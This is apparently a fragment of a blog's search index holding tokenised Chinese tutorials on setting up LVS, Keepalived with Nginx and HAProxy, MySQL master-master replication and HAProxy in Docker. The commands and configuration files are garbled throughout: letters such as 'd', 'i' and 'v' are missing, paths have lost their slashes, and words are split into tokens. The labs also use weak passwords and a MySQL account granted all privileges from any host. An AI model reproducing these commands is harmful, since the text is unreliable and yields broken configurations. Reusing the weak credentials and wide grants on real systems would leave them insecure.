,"$","'","etcsysconfgnetwork","-","scrptsfcfg","-","ens","32","echo","\"","GATEWAY","=","192.168.70.2","\"","etcsysconfgnetwork","-","scrptsfcfg","-","ens","32","systemctl","restart","networksystemctl","restart","httpyum","-","y","nstall","net","-","toolsp","=","192.168.70.100","fconfg","lo",":","0","$","p","broacast","$","p","netmask","255.255.255.255","uproute","a","-","host","$","p","lo",":","0","#","1","是","关闭","echo","\"","1","\"","procsysnetp","4","confloarp","_","gnoreecho","\"","2","\"","procsysnetp","4","confloarp","_","announceecho","\"","1","\"","procsysnetp","4","confallarp","_","gnoreecho","\"","2","\"","procsysnetp","4","confallarp","_","announce","#","在","所有","RS","上","部署","RS","脚本","：","#","!","bnbashyum","-","y","nstall","http","net","-","toolssystemctl","restart","httpecho","\"","THIS","IS","NODE","03","\"","arwwwhtmlnex",".","htmlp","=","192.168.70.100","fconfg","lo",":","0","$","p","broacast","$","p","netmask","255.255.255.255","uproute","a","-","host","$","p","lo",":","0","echo","\"","1","\"","procsysnetp","4","confloarp","_","gnoreecho","\"","2","\"","procsysnetp","4","confloarp","_","announceecho","\"","1","\"","procsysnetp","4","confallarp","_","gnoreecho","\"","2","\"","procsysnetp","4","confallarp","_","announce","DS","部署","fconfg","ens","32",":","0","192.168.70.100","broacast","192.168.70.255","netmask","255.255.255.0","up","#","本地","重","定向",",","去往","192.168.70.100","的","流量","从","本地","ens","32",":","0","走","route","a","-","host","192.168.70.100","e","ens","32",":","0","psam","-","A","-","t","192.168.70.100",":","80","-","s","wrrpsam","-","a","-","t","192.168.70.100",":","80","-","r","192.168.70.20",":","80","-","m","-","w","1","psam","-","a","-","t","192.168.70.100",":","80","-","r","192.168.70.30",":","80","-","m","-","w","2","psam","-","ln","DS","脚本","#","!","bnbashyum","-","y","nstall","net","-","tools","psam","echo","\"","0","\"","procsysnetp","4","p","_","forwar","#","fconfg","ens","32",":","0","192.168.70.100","broacast","192.168.70.255","netmask","255.255.255.0","up","#","route","a","-","host","192.168.70.100","e","ens","32",":","0","psam","-","A","-","t","192.168.70.100",":","80","-","s","wrrpsam","-","a","-","t","192.168.70.100",":","80","-","r","192.168.70.20",":","80","-","g","-","w","9","psam","-","a","-","t","192.168.70.100",":","80","-","r","192.168.70.30",":","80","-","g","-","w","1","psam","-","lnpsam","-","Cfor","n","&","#","123",";","1",".",".","10","&","#","125",";",";","o","curl","192.168.70.100",":","80",";","one"],"url":"http://ymlog.cn/2020/02/19/LVS/","title":"Linux Virtual Server","content":"LVS简介在已有的负载均衡技术中，IP负载均衡是效率最高的。它将一组服务器构建成一个高性能、高可用的虚拟服务器。如图，LVS一共有以下两部分组成：\n\n\n\nLoad Balance Machine，提供调度的机器，负责接收用户请求后转发...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/","name":"中间件"},"date":"2020-02-19 21:33:30"},{"word":["Keepale","简介","是","Lnux","一个","轻量级","的","高","可用","解决方案","，","Keepale","起初","是","为了","LVS","设计","的","，","专门","用来","监控","集群","系统","中","各个","服务","节点","状态","，","如果","某个","服务器","节点","出现","故障","，","keepale","将","检测","到","后","自动","将","节点","剔除","keepale","后来","加入","VRRP","协议","，","（","虚拟","路由","冗余","协议","）","，","目的","是","解决","静态","路由","出现","的","单点","故障","问题","，","通过","VRRP","协议","可以","实现","网络","不","间断","稳定","运行","，","因此","Keepale","也","具有","Ha","功能","两","大","功能","：","健康","检查","和","失败","切换","健康","检查","：","采用","TCP","三次","握手","，","ICMP","请求","，","HTTP","请求","，","UDP","echo","请求","等","方式","对","负载","均衡","后端","真实","服务器","进行","保","活","。","失败","切换","：","主要","应用于","配置","主备","模式","负载","均衡器","，","利用","VRRP","协议","维持","主备","的","心跳","，","当","主","负载","均衡","出现","问题","的","时候","，","由","备","负载","均衡器","承载","对应","的","业务","，","从而","在","最大","限度","上","减少","流量","的","损失","IPVS","疯转","，","Keepale","里面","所有","对","LVS","的","相关","操作","并不","直接","使用","psam","客户端","程序","，","而是","直接","使用","ps","提供","的","函数","进程","操作","。","VRRP","协议","VRRP","协议","：","VRRP","协议","是","一种","容错","的","主备","协议","，","保证","当","主机","的","下","一跳","路由","出现","故障","的","时候","，","由","另外","一台","路由","来","替代","出现","故障","的","路由器","进行","工作","，","通过","VRRP","可以","在","网络","发生","故障","时","，","透明的","进行","设备","切换","而","不","影响","主机","之间","数据通信","VRRP","虚拟","路由器","：","VRRP","虚拟","路由器","是","由","多","台","物理","路由器","组成","，","对外","共享","一个","或","多","个","IP","地址","，","这个","IP","地址","是","虚拟","出来","的","，","不","属于","任何","一台","路由器","，","称之为","VIP","。","VRRP","路由器","：","VRRP","路由器","就是","一台","路由器","，","只是","上面","运行","了","VRRP","协议","主","路由器","：","虚拟","路由","内部","有","多","台","物理","路由器","，","但","通常","只有","一台","物理","路由器","对外","提供","服务","，","主","路由器","是","选举","算法","选出","对外","提供","各种","网络","功能","备份","路由器","：","VRRP","组","中","除了","主","路由器","之外","的","所有","路由器","，","不","对外","提供","任何","服务","，","只","接受","主","路由器","的","通告","，","当","主","路由器","挂掉时","，","重新","进行","选举","算法","，","接替","master","路由器","三种","状态","：","Intalze","、","Master","、","Backup","选举","机制","：","优先级","抢占","模式","下","，","一旦","有","优先级","高的","路由器","加入","，","即","成","为","Master","；","非","抢占","模式","下","只要","Master","不","挂","，","优先级","高的","路由器","只能","等待","。","只有","作为","Master","的","VRRP","路由器","会","一直","发送","VRRP","广播","报文","。","Keepale","架构","KeepAle","源码","模块","：","check","core","lbpfwc","lbps","*","rrp","core","：","keepale","核心","程序","，","比如","全局","配置","解析","，","进程","启动","等","rrp","：","实现","rrp","协议","的","功能","check","：","keepale","的","healthchecker","子","进程","的","目录","，","包括","了","所有","健康","检查","方式","以及","对应","的","配置","解析","信息","，","LVS","配置","解析","也","在","这里","lbpfwc","：","ptables","(","pchans","库",")","，","主要","用来","配置","LVS","中的","frewall","-","mark","lbps","*","：","LVS","用到","的","文件","ScheulerlOMultplexer","是","一个","IO","复用","分发","调度","器","，","它","负载","安排","Keepale","所有","内部","的","任务","请求","Memory","Mngt","是","一个","内存","管理机制","，","这个","框架","提供","了","访问","内存","的","一些","通用","方法","Control","Plane","时","keepale","的","控制","版面","，","可以","实现","对","配置文件","编译","和","解析","Core","Componets","Watchog","：","是","计算机","可靠","领域","简单","而又","非常","有效的","检测工具","，","Keepale","正式","通过","它","监控","Checkers","和","VRRP","进程","的","Checkers","：","这时","Keepale","最","基础","的","功能","，","也是","最主要","的","功能","，","可以","实现","对","服务器","运行","状态","检测","和","故障","隔离","VRRP","Stack","：","这时","Keepale","后来","引用","VRRP","功能","，","可以","实现","HA","集群","中","失败","切换","功能","，","负责","负载","均衡器","之间","的","实","拍","切换","FalOer","IPVS","Wrapper","：","这个","是","IPVS","功能","的","一个","实现","，","IPVSwrapper","模块","可以","设置","好","IPVS","规则","发送","至","内核","空间","并且","提供给","IPVS","模块","，","最终","实现","IPVS","模块","的","负载","功能","Netlnk","Reflector","：","用来","实现","高","可用","集群","Faloer","是","虚拟","IP","（","VIP","）","的","设置","和","切换","keepale","进程","：","keepale","配置","文件","keepale","配置文件","分为","三","类","：","global","：","全局","配置","文件","rrp","配置","ls","配置","，","如果","仅","使用","keepale","做","HA","，","ls","可以","不用","配","总体","[","root@haproxy","]","#","cat","etckeepalekeepale",".","conf","grep","-","E","'","^","#","^","$","'","!","Confguraton","Fle","for","keepaleglobal","_","efs","&","#","123",";","#","全局","定义","notfcaton","_","emal","&","#","123",";","acassen","@","frewall",".","loc","#","通知","emal","faloer","@","frewall",".","loc","sysamn","@","frewall",".","loc","&","#","125",";","notfcaton","_","emal","_","from","Alexanre",".","Cassen","@","frewall",".","loc","#","Emal","发送","者","smtp","_","serer","192.168.200.1","#","SMTP","服务器","smtp","_","connect","_","tmeout","30","#","连接","超时","router","_","LVS","_","DEVEL","#","Router","-",",","是","路由","标识","，","通常","是","主机","名","rrp","_","skp","_","check","_","a","_","ar","#","VRRP","协议","跳过","健康","检查","通告","rrp","_","strct","#","VRRP","自定义","脚本","rrp","_","garp","_","nteral","0","rrp","_","gna","_","nteral","0","&","#","125",";","rrp","_","nstance","VI","_","1","&","#","123",";","#","VRRP","组","state","MASTER","#","master","状态","nterface","eth","0","#","接口","rtual","_","router","_","51","#","虚拟","路由器","ID","，","同一个","局域网","内","prorty","100","#","优先级","aert","_","nt","1","authentcaton","&","#","123",";","#","认证","auth","_","type","PASS","auth","_","pass","1111","&","#","125",";","rtual","_","paress","&","#","123",";","#","VIP","地址","，","之后","用户","访问","只","需要","用","p","地址","即可","192.168.200.16","192.168.200.17","192.168.200.18","&","#","125",";","&","#","125",";","#","后面","是","LVS","相关","，","这里","先","不","写","全局","Keepale","的","详细","配置","全局","配置","&","#","123",";","#","静态","IP","statc","_","paress","&","#","123",";","#","等价","于","p","命令","：","p","ar","a","192.168.1.124","br","+","e","eth","0","scope","global","192.168.1.124","br","+","e","eth","0","scope","global","&","#","125",";","#","静态","路由","statc","_","routes","&","#","123",";","src","$","SRC","_","IP","to","$","DST","_","IP","e","$","SRC","_","DEVICE",".",".",".","src","$","SRC","_","IP","to","$","DST","_","IP","a","$","GW","e","$","SRC","_","DEVICE","&","#","125",";","&","#","125",";","VRRPVRRPD","：","rrp","同步","组","和","rrp","实例","VRRP","Sync","Groups","同步","组","里","的","任何","一个","成员","产生","问题","，","则","进行","master","和","backup","切换","。","比如","内","网","和","外网","的","实例","不在","一个","同步","组","，","其中","一个","网段","异常","，","则","VIP","不会","漂移","。","rrp","_","sync","_","group","VG","_","1","&","#","123",";","group","&","#","123",";","nse","_","network","#","这里","是","实例","名","，","比如","VI","_","1","outse","_","network","&","#","125",";","notfy","_","master","pathtoto","_","master",".","sh","#","当","切换","到","master","时","，","执行","脚本",".",".",".","notfy","_","backup","path","_","toto","_","backup",".","sh","notfy","_","fault","\"","pathfault",".","sh","VG","_","1","\"","notfy","pathtonotfy",".","sh","#","切换","后","发送","邮件","通知","smtp","_","alert","&","#","125",";","rrp","实例","主要","定义","漂移","组","的","p","地址","rrp","_","nstance","nse","_","network","&","#","123",";","state","MASTER","#","定义","初始","Intal","状态","，","启动","后","根据","优先","级","马上","竞选","，","state","不","代表","这","台","一直","是","master","nterface","eth","0","#","实例","绑定","的","网卡","track","_","nterface","&","#","123",";","eth","0","eth","1","&","#","125",";","#","设置","额外","的","监控","，","里面","任何","一个","网卡","出现","问题","，","都会","进入","fault","状态","rtual","_","router","_","51","#","VRID","虚拟","路由器","ID","prorty","100","aert","_","nt","1","#","检查","隔离","，","默认","1","s","authentcaton","&","#","123",";","auth","_","type","PASS","autp","_","pass","1234","&","#","125",";","#","认证","设置","，","authe","_","type","可","以","是","pass","和","ah","rtual","_","paress","&","#","123",";","192.168.200.1724","e","eth","1","192.168.200.1824","e","eth","2","label","eth","2",":","1","&","#","125",";","#","发生","切换","时","添加","删除","路由","rtual","_","routes","&","#","123",";","src","192.168.100.1","to","192.168.109.024","a","192.168.200.254","e","eth","1","&","#","125",";","nopreempt","#","设置","为","不","抢占","，","只能","设置","为","state","=","BACKUP","，","且","优先级","最高的","机器","上","preemtp","_","elay","300","ebug","#","Debug","级别","&","#","125",";","LVSrtual","_","serer","192.168.200.100","443","&","#","123",";","#","设置","一个","Vrtual","Serer","：","VIP","+","Port","elay","_","loop","6","#","serce","pollng","的","elay","时间","lb","_","algo","rr","#","LVS","调度","算法","，","有","rr","wrr","lc","wlc","lblc","sh","h","lb","_","kn","NAT","#","LVS","集群","模式","，","有","NAT","、","DR","、","TUN","persstence","_","tmeout","50","#","会话","保持","时间","protocol","TCP","#","使用","TCP","协议","，","有","TCP","、","UDP","sorry","_","serer","192.168.200.200","1358","#","备用","机","，","所有","的","real","serer","失效","后","再用","real","_","serer","192.168.201.100","443","&","#","123",";","#","真实","物理","主机","weght","1","#","权重","默认","为","1","，","0","为","失效","nhbt","_","on","_","falure","#","在","健康","检查","失败","后","，","将","weght","设置","为","0","，","而不是","从","ps","中","删除","#","配置","任意","一种","健康","检查","方式","：","HTTP","_","GETSSL","_","GETTCP","_","CHECKSMTP","_","CHECKMISC","_","CHECK","SSL","_","GET","&","#","123",";","url","&","#","123",";","path","gest","ff","20","a","2481","f","97","b","1754","ef","3","e","12","ec","3","a","9","cc","#","SSL","检查","后","的","摘要","信息","(","genhash","工具","算","出",")","&","#","125",";","connect","_","tmeout","3","#","连接","超时","时间","nb","_","get","_","retry","3","#","重连","次数","elay","_","before","_","retry","3","#","重连","间隔时间","&","#","125",";","HTTP","_","GET","&","#","123",";","url","&","#","123",";","path","testurltest",".","jsp","gest","640205","b","7","b","0","fc","66","c","1","ea","91","c","463","fac","6334","&","#","125",";","&","#","125",";","TCP","_","CHECK","&","#","123",";","#","TCP","健康","检查","connect","_","port","80","bnto","192.168.1.1","connect","_","tmeout","4","&","#","125",";","SMTP","_","CHECK","&","#","123",";","host","&","#","123",";","connect","_","p","IP","ADDRESS","connect","_","port","PORT","bnto","IP","ADDRESS","&","#","125",";","&","#","125",";","&","#","125",";","&","#","125",";","ls","实例","ls","配置","实例","rtual","_","serer","192.168.1.1","80","&","#","123",";","elay","_","loop","3","lb","_","algo","wlc","lb","_","kn","DR","persstence","_","tmeout","1200","protocol","TCP","ha","_","suspen","real","_","serer","192.168.1.11","80","&","#","123",";","weght","3","TCP","_","CHECK","&","#","123",";","connect","_","tmeout","3","&","#","125",";","&","#","125",";","real","_","serer","192.168.1.12","80","&","#","123",";","weght","3","TCP","_","CHECK","&","#","123",";","connect","_","tmeout","3","&","#","125",";","&","#","125",";","&","#","125",";","Keepale","+","Ngnx","环境","准备","VIP","：","192.168.70.199","机器","IP","地址","服务","Noe","1","192.168.70.10","ngnx","、","keepale","Noe","2","192.168.70.20","ngnx","、","keepale","Web","1","192.168.70.30","http","Web","2","192.168.70.40","http","Web","1","-","2","yum","-","y","nstall","httpsystemctl","restart","httpecho","\"","THIS","IS","$","HOSTNAME",".",".","\"","arwwwhtmlnex",".","html","Noe","01","noe","01","，","主","节点","#","配置","Ngnx","反向","代理","yum","-","y","nstall","epel","-","releaseyum","-","y","nstall","ngnxcat","etcngnxconf",".","lb",".","conf","'","EOF","'","#","负载","均衡","中的","后端","服务器","池","upstream","webserer","&","#","123",";","serer","192.168.70.30",";","serer","192.168.70.40",";","&","#","125",";","#","将","本地","的","8080","端口","请求","转发","到","代理服务器","池","中","serer","&","#","123",";","lsten","8080",";","locaton","&","#","123",";","proxy","_","pass","http",":","webserer",";","&","#","125",";","&","#","125",";","EOFsystemctl","restart","ngnx","#","配置","Keepale","高","可用","yum","-","y","nstall","keepalem","etckeepalekeepale",".","conf","&","#","123",";",",",".","bak","&","#","125",";","#","注意","事项","，","check","_","ngnx","和花","括号","要有","空格","，","track","_","scrpt","要","写在","VIP","后面","cat","etckeepalekeepale",".","conf","'","EOF","'","global","_","efs","&","#","123",";","router","_","noe","01","&","#","125",";","#","定义","健康","检测","脚本","，","执行","间隔","为","1","s","，","如果","脚本","执行","异常","，","也就是","Ngnx","own","了","，","则","优先","级","-","20","rrp","_","scrpt","check","_","ngnx","&","#","123",";","scrpt","\"","rootcheck",".","sh","\"","nteral","1","weght","-","20","&","#","125",";","rrp","_","nstance","VI","_","1","&","#","123",";","#","noe","01","为","Master","角色","state","MASTER","#","使用","的","接口","为","ens","32","，","如果","不通","系统","需要","改","，","Keepale","服务","起","来时","，","VIP","就","挂在","ens","32","接口","上","nterface","ens","32","#","VID","，","同一个","局域网","需要","相同","rtual","_","router","_","51","#","主","节点","优先","级","，","定义","110","，","次","节点","为","100","prorty","110","aert","_","nt","1","#","VIP","地址","，","如果","时主主","备份","可以","定义","多","个","rtual","_","paress","&","#","123",";","192.168.70.199","&","#","125",";","#","脚本","跟踪","，","记住","空格","track","_","scrpt","&","#","123",";","check","_","ngnx","&","#","125",";","&","#","125",";","EOFsystemctl","restart","keepale","#","这","一段","不","能用","cat","的","形式","录入","，","不然","$","会","丢失","[","root","@","noe","01","~","]","#","cat","check",".","sh","#","!","bnbashecho","\"","THIS","SCRIPT","IS","RAN","！","！","！","\"","Num","=","$","(","ps","-","C","ngnx","-","-","no","-","heaer","wc","-","l",")","f","[","$","Num","-","eq","0","]",";","then","#","Num","=","0","意味着","Ngnx","挂","了","ext","1","else","ext","0","fchmo","+","x","rootcheck",".","sh","Noe","02","noe","02","，","备份","节点","#","配置","Ngnx","反向","代理","yum","-","y","nstall","epel","-","releaseyum","-","y","nstall","ngnxcat","etcngnxconf",".","lb",".","conf","'","EOF","'","upstream","webserer","&","#","123",";","serer","192.168.70.30",";","serer","192.168.70.40",";","&","#","125",";","serer","&","#","123",";","lsten","8080",";","serer","_","name","192.168.20.10",";","locaton","&","#","123",";","proxy","_","pass","http",":","webserer",";","&","#","125",";","&","#","125",";","EOFsystemctl","restart","ngnx","#","配置","Keepale","高","可用","yum","-","y","nstall","keepalem","etckeepalekeepale",".","conf","&","#","123",";",",",".","bak","&","#","125",";","cat","etckeepalekeepale",".","conf","'","EOF","'","global","_","efs","&","#","123",";","router","_","noe","02","&","#","125",";","rrp","_","nstance","VI","_","1","&","#","123",";","state","BACKUP","nterface","ens","32","rtual","_","router","_","51","prorty","100","aert","_","nt","1","rtual","_","paress","&","#","123",";","192.168.70.199","&","#","125",";","&","#","125",";","EOFsystemctl","restart","keepale","实验","效果","测试","节点","Down","Keepale","Down","Ngnx","Keepale","+","haproxy","实验","环境","准备","VIP","：","192.168.70.199","机器","IP","地址","服务","Noe","1","192.168.70.10","haproxy","、","keepale","Noe","2","192.168.70.20","haproxy","、","keepale","Web","1","192.168.70.30","marab","Web","2","192.168.70.40","marab","MySQL","双主","noe","03","yum","-","y","nstall","marab","-","serer","se","-","'","^","\\","[","mysql","\\","]","$","a","\\","bnlog","-","gnore","=","nformaton","_","schema","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","bnlog","-","gnore","=","mysql","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","skp","-","name","-","resole","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","auto","-","ncrement","-","ncrement","=","1","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","log","-","bn","=","mysql","-","bn","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","auto","_","ncrement","_","offset","=","1","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","serer","-","=","1","'","etcmy",".","cnf",".","serer",".","cnfcat","etcmy",".","cnf",".","serer",".","cnf","grep","-","E","'","#","^","$","'","mysql","-","uroot","-","e","\"","grant","replcaton","slae","on","*",".","*","to","'","repuser","'","@","'","192.168.70.40","'","entfe","by","'","123456","'",";","\"","mysql","-","uroot","-","e","\"","show","master","status",";","\"","mysql","-","uroot","-","e","\"","change","master","to","master","_","host","=","'","192.168.70.40","'",",","master","_","port","=","3306",",","master","_","user","=","'","repuser","'",",","master","_","passwor","=","'","123456","'",",","master","_","log","_","fle","=","'","mysql","-","bn",".","000003","'",",","master","_","log","_","pos","=","407",";","\"","mysql","-","uroot","-","e","\"","start","slae",";","\"","#","授权","用户","，","便于","测试","mysql","-","uroot","-","e","\"","grant","all","prleges","on","*",".","*","to","'","zhoujng","'","@","'","%","'","IDENTIFIED","BY","'","000000","'",";","\"","noe","04","yum","-","y","nstall","marab","-","serer","se","-","'","^","\\","[","mysql","\\","]","$","a","\\","bnlog","-","gnore","=","nformaton","_","schema","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","bnlog","-","gnore","=","mysql","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","skp","-","name","-","resole","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","auto","-","ncrement","-","ncrement","=","2","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","log","-","bn","=","mysql","-","bn","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","auto","_","ncrement","_","offset","=","2","'","etcmy",".","cnf",".","serer",".","cnfse","-","'","^","\\","[","mysql","\\","]","$","a","\\","serer","-","=","2","'","etcmy",".","cnf",".","serer",".","cnfmysql","-","uroot","-","e","\"","grant","replcaton","slae","on","*",".","*","to","'","repuser","'","@","'","192.168.70.30","'","entfe","by","'","123456","'",";","\"","mysql","-","uroot","-","e","\"","show","master","status",";","\"","mysql","-","uroot","-","e","\"","change","master","to","master","_","host","=","'","192.168.70.30","'",",","master","_","port","=","3306",",","master","_","user","=","'","repuser","'",",","master","_","passwor","=","'","123456","'",",","master","_","log","_","fle","=","'","mysql","-","bn",".","000003","'",",","master","_","log","_","pos","=","402",";","\"","mysql","-","uroot","-","e","\"","start","slae",";","\"","mysql","-","uroot","-","e","\"","grant","all","prleges","on","*",".","*","to","'","zhoujng","'","@","'","%","'","IDENTIFIED","BY","'","000000","'",";","\"","检查","MySQL","主主","同步","是否","成功","：","HaProxy","代理","Noe","01","02","的","Haproxy","配置","相同","yum","-","y","nstall","haproxy","[","root","@","noe","01","~","]","#","cat","etchaproxyhaproxy",".","cfg","global","log","127.0.0.1","local","2","chroot","arlbhaproxy","pfle","arrunhaproxy",".","p","maxconn","4000","user","haproxy","group","haproxy","aemon","stats","socket","arlbhaproxystatslsten","mysql","_","proxy","bn","0.0.0.0",":","3306","moe","tcp","balance","source","serer","mysqlb","1","192.168.70.30",":","3306","weght","1","check","serer","mysqlb","2","192.168.70.40",":","3306","weght","2","checklsten","stats","moe","http","bn","0.0.0.0",":","8080","stats","enable","stats","ur","bs","stats","realm","haproxy","\\","statstcs","stats","auth","amn",":","amnsystemctl","restart","haproxy","Keepale","高","可用","noe","01","#","noe","01","上","写","触发","脚本","yum","-","y","nstall","keepale","[","root","@","noe","01","~","]","#","cat","etckeepalekeepale",".","confglobal","_","efs","&","#","123",";","router","_","noe","01","&","#","125",";","rrp","_","scrpt","chk","_","http","_","port","&","#","123",";","#","脚本","所在位置","scrpt","\"","rootcheck","_","proxy","_","p",".","sh","\"","nteral","1","weght","-","20","&","#","125",";","rrp","_","nstance","VI","_","1","&","#","123",";","state","MASTER","nterface","ens","32","rtual","_","router","_","51","prorty","110","aert","_","nt","1","rtual","_","paress","&","#","123",";","192.168.70.199","&","#","125",";","track","_","scrpt","&","#","123",";","chk","_","http","_","port","&","#","125",";","&","#","125",";","[","root","@","noe","01","~","]","#","cat","check","_","proxy","_","p",".","sh","#","!","bnbashecho","\"","THIS","SCRIPT","IS","RAN","！","！","！","\"","Num","=","$","(","ps","-","C","haproxy","-","-","no","-","heaer","wc","-","l",")","f","[","$","Num","-","eq","0","]",";","then","ext","1","else","ext","0","fsystemctl","restart","keepale","noe","02","yum","-","y","nstall","keepale","[","root","@","noe","01","~","]","#","cat","etckeepalekeepale",".","confglobal","_","efs","&","#","123",";","router","_","noe","01","&","#","125",";","rrp","_","nstance","VI","_","1","&","#","123",";","state","MASTER","nterface","ens","32","rtual","_","router","_","51","prorty","110","aert","_","nt","1","rtual","_","paress","&","#","123",";","192.168.70.199","&","#","125",";","track","_","scrpt","&","#","123",";","chk","_","http","_","port","&","#","125",";","&","#","125",";","systemctl","restart","keepale","【","完","】"],"url":"http://ymlog.cn/2020/02/19/Keepalived%E9%AB%98%E5%8F%AF%E7%94%A8/","title":"Keepalived高可用","content":"Keepalived简介\n是Linux一个轻量级的高可用解决方案，Keepalive起初是为了LVS设计的，专门用来监控集群系统中各个服务节点状态，如果某个服务器节点出现故障，keepalive将检测到后自动将节点剔除\n\nkeepal...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/","name":"中间件"},"date":"2020-02-19 19:34:05"},{"word":["Haproxy","简介","说明","一款","高","性能","+","代理","负载","均衡","软件","，","目前","使用","广泛","，","支持","实现","TCPHTTP","的","负载","均衡","免费","开源","最大","并发","量能","达到","5","w","支持","多种","负载","均衡","算法","，","同时","支持","sesson","支持","虚拟","主机","拥有","服务","监控","页面","，","可以","了解","系统","实时","运行","状态","通常","不做","正向","代理","，","有","更","好的","选择","(","Squ",")","通常","不做","缓存","代理","，","有","更","好的","选择","（","Varnsh","）","不会","改变","请","求和","响应","报文","不","用于","Web","服务器","不是","基于","数据","报","的","负载","均衡器","，","看不到","IP","数据","报","haproxy","文档","：","https",":","cbonte",".","gthub",".","ohaproxy","-","con","Haproxy","配置","文件","rpm","-","ql","haproxyetchaproxyhaproxy",".","cfg","#","主","配置","文件","usrlbsystemsystemhaproxy",".","serce","#","守护","进程","[","root@16a3b18f2a","]","#","cat","etchaproxyhaproxy",".","cfg","grep","-","E","'","#","^","$","'","global","#","全局","配置","项","log","127.0.0.1","local","2","#","syslog","服务器","位置","及","类型","chroot","arlbhaproxy","#","chroot","路径","：","工作","目录","pfle","arrunhaproxy",".","p","#","进程","文件","maxconn","4000","#","最大","连接","数","user","haproxy","#","用户","group","haproxy","#","组","aemon","#","以","守护","进程","运行","stats","socket","arlbhaproxystats","#","socket","通信","状态","efaults","#","默认","配置","项","moe","http","#","运行","模式","或","协议","log","global","#","定义","每个","实例","启动","事件","和","流量","日志","opton","httplog","#","http","日志","opton","ontlognull","opton","http","-","serer","-","close","opton","forwarfor","except","127.0.0.08","opton","respatch","retres","3","tmeout","http","-","request","10","s","#","http","-","request","超时","时间","tmeout","queue","1","m","#","队列","超时","时间","tmeout","connect","10","s","#","连接","超时","时间","tmeout","clent","1","m","#","客户端","超时","时间","tmeout","serer","1","m","#","服务端","超时","时间","tmeout","http","-","keep","-","ale","10","s","#","保持","长","连接","超时","时间","tmeout","check","10","s","#","check","超时","时间","maxconn","3000","#","定义","最大","并发","数","fronten","man","*",":","5000","#","前端","配置","，","定义","了","一系列","监听","套接","字","，","这些","套接","字","可接受","客户端","请求","并","建立","连接","，","监听","5000","端口","，","（","bn","*",":","80",")","#","ACL","规则","：","(","locaton","url",")","#","测试","请求","的","URL","是以","指定","模式","开头","acl","url","_","statc","path","_","beg","-","statc","mages","jaascrpt","stylesheets","#","测试","请求","Strng","是否","以","指定","模式","结尾","acl","url","_","statc","path","_","en","-",".","jpg",".","gf",".","png",".","css",".","js","use","_","backen","statc","f","url","_","statc","#","如果","user","_","backen","没","能","匹配","，","指定","后端","的","名称","为","app","efault","_","backen","app","#","定义","后端","配置","：","定义","一系列","“","后端","”","服务器","，","代","理会","将","请求","转发","给","这些","服务器","#","statc","组","后端","backen","statc","balance","rounrobn","#","负载","均衡","算法","为","轮询","serer","statc","127.0.0.1",":","4331","check","#","app","组","后端","backen","app","balance","rounrobn","serer","app","1","127.0.0.1",":","5001","check","serer","app","2","127.0.0.1",":","5002","check","serer","app","3","127.0.0.1",":","5003","check","serer","app","4","127.0.0.1",":","5004","check","配置","文件","结构","全局","配置","项","默认","配置","项","前端","配置","项","后端","配置","项","监听","配置","：","通过","关联","前端","配置","想","和","后端","配置","项","（","fronten","&","amp",";","backen","）","定义","一个","完整","代理","。","通常","只","对","TCP","流量","有用","。","Docker","&","amp",";","Harpoxy","三台","机器","：","角色","IP","地址","功能","WEB","1","172.18.12.10","http","–","THIS","IS","WEB","1","…","WEB","2","172.18.12.20","http","–","THIS","IS","WEB","2","…","Proxy","172.18.12.30","CentOS","7","Haproxy","#","!","bnbash","#","安装","ocker","环境","yum","nstall","-","y","yum","-","utls","ece","-","mapper","-","persstent","-","ata","lm","2","yum","-","confg","-","manager","-","-","a","-","repo","https",":","mrrors",".","alyun",".","comocker","-","celnuxcentosocker","-","ce",".","repo","yum","nstall","ocker","-","ce","-","ysystemctl","start","ockersystemctl","enable","ockersuo","mkr","-","p","etcockersuo","tee","etcockeraemon",".","json","-","'","EOF","'","&","#","123",";","\"","regstry","-","mrrors","\"",":","[","\"","https",":","ukws","02","a",".","mrror",".","alyuncs",".","com","\"","]","&","#","125",";","EOFsuo","systemctl","aemon","-","reloasuo","systemctl","restart","ocker","#","创建","ocker","桥接","网络","，","用于","给","容器","分配","IP","地址","ocker","network","create","-","-","rer","brge","-","-","subnet","=","172.18.12.016","-","-","gateway","172.18.1.1","mynet","#","创建","后端","站点","，","分","别","为","web","1","和","web","2","ocker","run","-","e","TZ","=","\"","AsaShangha","\"","-","t","-","h","web","1",".","com","-","-","name","web","1","-","-","network","=","mynet","-","-","p","172.18.12.10","httpocker","run","-","e","TZ","=","\"","AsaShangha","\"","-","t","-","h","web","2",".","com","-","-","name","web","2","-","-","network","=","mynet","-","-","p","172.18.12.20","httpecho","\"","THIS","IS","WEB","1",".",".",".","\"","rootnex",".","htmlocker","cp","rootnex",".","html","web","1",":","usrlocalapache","2","htocssleep","1","echo","\"","THIS","IS","WEB","2",".",".",".","\"","rootnex",".","htmlocker","cp","rootnex",".","html","web","2",":","usrlocalapache","2","htocs","#","创建","代理服务器","haproxy","，","镜","像","为","centos","7","#","参数","说明","：","-","-","prlege","+","usrbnnt","是","为了","能够","让","程序","以","root","运行","，","Contaner","默认","的","Root","只是","相当于","普通用户","#","TZ","：","指定","时区","#","-","h","：","指定","域名","#","-","-","network","：","指定","网络","类型","为","我","创建","的","网络","ocker","run","-","e","TZ","=","'","AsaShangha","'","-","-","prlege","-","t","-","h","haproxy",".","com","-","-","name","myhaproxy","-","-","network","=","mynet","-","-","p","172.18.12.30","centos",":","7","usrsbnnt","#","查看","是否","连同","#","ocker","exec","-","t","myhaproxy","bash","-",